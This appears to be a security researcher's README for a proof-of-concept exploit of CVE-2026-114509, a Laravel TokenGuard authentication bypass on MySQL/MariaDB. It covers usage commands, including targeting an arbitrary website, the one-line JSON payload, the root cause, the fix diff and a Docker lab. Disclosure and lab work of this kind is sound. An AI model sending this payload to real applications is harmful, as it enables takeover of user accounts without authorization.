# Authentication Bypass in Laravel TokenGuard (CVE-2026-114509)

A proof-of-concept exploit for CVE-2026-114509, an authentication bypass in Laravel's built-in TokenGuard (`auth:api`) that allows an unauthenticated attacker to authenticate as an existing user on MySQL/MariaDB backends without knowing any valid API token.

## Usage

```bash
# Bring up the lab (vulnerable app :8891, fixed app :8892, MySQL 8)
$ docker compose up -d --build

# Run the PoC (exploit on vulnerable, normal login, exploit attempt on fixed)
$ python poc.py

# Inspect the requests with Burp Suite / mitmproxy
$ python poc.py --proxy http://127.0.0.1:8080

# Target a specific user id (enumerates the token leading value [0..9])
$ python poc.py --target 2

# Target a specific user email
$ python poc.py --targetUser user2@email.com

# Target a specific vulnerable website
$ python poc.py https://vulnerable.com
```

Expected output:

```text
2026-10-19 22:41:15,177 [*] vuln  POST {"api_token": [0]} -> 200 user@email.com (22 ms)
2026-10-19 22:41:15,188 [*] vuln  POST {"api_token": "b7f9d2c4…"} -> 200 user@email.com (10 ms)
2026-10-19 22:41:15,196 [*] fixed POST {"api_token": [0]} -> 401 unauthenticated (7 ms)
```

The first request authenticates with **no valid token** — that is the account takeover. The second shows normal token authentication still works. The third shows the patched build rejecting the same payload.

## Vulnerable Versions

- laravel/framework `< 13.29.0` (13.x) — per the advisory; fix first shipped in tag `v13.27.0`
- laravel/framework `< 12.68.0` (12.x)
- 11.x `< v11.56.1`
- Exploitable when the users table lives on **MySQL or MariaDB**

## Root Cause

In `src/Illuminate/Auth/TokenGuard.php`, `user()` only checked emptiness before hitting the provider:

```php
$token = $this->getTokenForRequest();

if (! empty($token)) {
    $user = $this->provider->retrieveByCredentials([
        $this->storageKey => $this->hash ? hash('sha256', $token) : $token,
    ]);
}
```

A request with JSON body `{"api_token":[0]}` makes `$token` a PHP array `[0]` — truthy, so it passes the gate. `EloquentUserProvider::retrieveByCredentials()` turns array values into a `whereIn()`:

```php
foreach ($credentials as $key => $value) {
    if (is_array($value) || $value instanceof Arrayable) {
        $query->whereIn($key, $value);
    }
```

producing `select * from users where api_token in (?) limit 1` with an **integer** binding. Under MySQL/MariaDB the VARCHAR column is compared numerically: any stored token that does not start with a digit casts to `0`, the row matches, and `first()` returns that user — the guard then treats the request as authenticated.

Two variants do **not** work, and prove the cast is the key:

- `?api_token[]=0` (query string) → array of the **string** `'0'` → `IN ('0')` is a string-vs-string comparison, no cast, no match.
- `?api_token=0` (scalar) → PHP treats `"0"` as empty → blocked by the old `empty()` gate itself.

The integer must come from a JSON body, where `json_decode` produces a real PHP int (`PDO::PARAM_INT`).

## Affected Endpoints

Any route protected by the token guard, credential parameter `api_token`:

```
POST /any-protected-route
Content-Type: application/json

{"api_token":[0]}
```

## Impact

An unauthenticated attacker authenticates as the first existing user whose API token does not start with a digit (typical randomly generated tokens), gaining full access to that account on every route protected by the guard. No knowledge of any valid token is required.

CVSS: 9.2 Critical — `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

## Fix

Commit `9b21ce0a9bb` ("fix token retrieval", 13.x — backported as `8dbb08bc` in 12.x and `5056ca53` in 11.x) adds `is_string()` so non-string credentials never reach the provider:

```diff
-        if (! empty($token)) {
+        if (is_string($token) && ! empty($token)) {

-        if (empty($credentials[$this->inputKey])) {
+        if (! is_string($credentials[$this->inputKey] ?? null) || empty($credentials[$this->inputKey])) {
```

First fixed tags: `v13.27.0`, `v12.68.0`, `v11.56.1` (the advisory designates `>= 13.29.0` / `>= 12.68.0`).

## Lab Setup

```bash
docker compose up -d --build
```

Wait for the build (~2-4 min on first run). The lab exposes:

- **vulnerable** app — `laravel/framework 13.x#0189a60b` (last commit before the fix): http://localhost:8891
- **fixed** app — `13.x#9b21ce0a` (first shipped in v13.27.0): http://localhost:8892
- MySQL 8 (internal only, not published)

Seeded data: two users — `user@email.com` with `api_token = b7f9d2c4a8e6b1f3d5a0c9e2b4d6f8a1c` (letter-first) and `user2@email.com` with `api_token = 2d4f6h8j…` (digit-first, reachable via `{"api_token":[2]}`).

```bash
# Test exploit
python poc.py

# Inspect with Burp
python poc.py --proxy http://127.0.0.1:8080
```

Teardown: `docker compose down -v`

Server-side verdict log per request lands in `logs/vuln.log` and `logs/fixed.log`.

## Disclaimer

This tool is for educational and research purposes only. Use it only on systems you own or have explicit permission to test. The author is not responsible for any misuse or damage caused by this program.

## QuimeraX Intelligence

QuimeraX Intelligence is an advanced EASM and Cyber Threat Intelligence platform specializing in identifying critical vulnerabilities in complex systems. The platform proactively monitors, detects, and alerts clients about security threats, ensuring transparency and rapid response to potential risks. Clients receive immediate notifications and comprehensive reports if their systems are found vulnerable, enabling them to take protective action. [learn more](https://hakaisecurity.io/quimera-team/)

## Hakai Security

[Hakai Security](https://hakaisecurity.io/) is a cybersecurity company founded by security professionals, committed to technical excellence. We offer tailored security solutions including advanced penetration testing, realistic Red Team simulations, and secure development practices to proactively protect our clients' assets from evolving cyber threats.

## Hacking Club

Hacking Club is the training platform where you learn cybersecurity through hands-on lessons, labs, and challenges created by experts working in our security consulting firm: straight from the battlefield to your training. Practice the vulnerability presented in this repository by the hacking club! [learn more](https://app.hackingclub.com/training/challenges/155)

## References

- [GHSA-f9x3-7vq9-cph6: Authentication Bypass in Laravel TokenGuard](https://yokai.hakaisecurity.io/en-ghsa-f9x3-7vq9-cph6-authentication-bypass-in-laravel-tokenguard/)
- [Official GitHub Security Advisory: GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)
- [Hacking Club Challenge](https://app.hackingclub.com/training/challenges/155)
- [Vulnerable code](https://github.com/laravel/framework/blob/0189a60b261bbd94bffe21bba4e43323cf6af051/src/Illuminate/Auth/TokenGuard.php)
- [KIKOmanasijev](https://github.com/KIKOmanasijev)
